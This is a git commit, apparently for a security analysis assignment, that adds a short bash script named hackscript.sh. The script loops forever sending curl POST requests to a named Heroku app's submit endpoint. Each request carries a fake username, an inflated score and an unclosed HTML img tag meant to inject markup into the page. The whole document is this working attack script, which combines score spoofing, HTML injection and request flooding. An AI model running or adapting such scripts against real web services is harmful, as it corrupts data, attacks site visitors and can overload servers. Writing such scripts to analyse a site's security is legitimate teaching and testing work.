cca940256007b2a5134ddfd43f6a47fe2521521c
DanielHKim <akhisuke@gmail.com>
2014-04-25 18:11:13 -0400

    Finished security analysis page

---
+++ security/hackscript.sh
@@ -0,0 +1,4 @@
+#!/bin/bash
+while [ 0 ]; do
+    curl --data "username=THE ROCK SAYS THE ROCK SAYS&score=9001&grid=<img src='therocksaysumadjabroni.jpg" http://stark-garden-6555.herokuapp.com/submit.json
+done
